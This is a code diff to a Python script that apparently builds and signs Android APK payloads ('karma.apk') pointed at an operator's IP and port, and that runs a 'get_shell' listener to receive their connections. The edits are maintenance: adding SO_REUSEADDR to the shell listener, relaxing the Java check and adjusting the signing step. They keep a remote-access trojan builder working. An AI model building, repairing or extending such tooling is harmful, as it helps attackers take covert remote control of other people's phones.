@@ -11,13 +11,12 @@ import pathlib
 import platform
 import re
 from subprocess import PIPE, run
-from colorama import Fore, Style,init
-from pyngrok import ngrok
 import socket
 import threading
 import itertools
 import queue
 
+sys.stdout.reconfigure(encoding='utf-8')
 
 banner = """\033[1m\033[91m
                     _           _____         _______
@@ -52,7 +51,6 @@ def clearDirec():
     if(platform.system() == 'Windows'):
         clear = lambda: os.system('cls')
         direc = "\\"
-        init(convert=True)
     else:
         clear = lambda: os.system('clear')
         direc = "/"
@@ -299,6 +297,8 @@ def get_shell(ip,port):
     soc = socket.socket() 
     soc = socket.socket(type=socket.SOCK_STREAM)
     try:
+        # Restart the TCP server on exit
+        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         soc.bind((ip, int(port)))
     except Exception as e:
         print(stdOutput("error")+"\033[1m %s"%e);exit()
@@ -367,9 +367,9 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
         print(e)
         sys.exit()
     java_version = execute("java -version")
-    version_no = re.search(pattern, java_version.stderr).groups()[0]
-    if java_version.stderr == "":print(stdOutput("error")+"Java Not Installed");exit()
-    if float(version_no) < 1.8: print(stdOutput("error")+"Java 8 is required ");exit()
+    if java_version.returncode: print(stdOutput("error")+"Java not installed or found");exit()
+    #version_no = re.search(pattern, java_version.stderr).groups()[0]
+    # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
@@ -382,7 +382,7 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     if not resOut.returncode:
         print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
         print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar "+outFileName+" --override",que],)
+        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
         t.start()
         while t.is_alive(): animate("Signing Apk ")
         t.join()
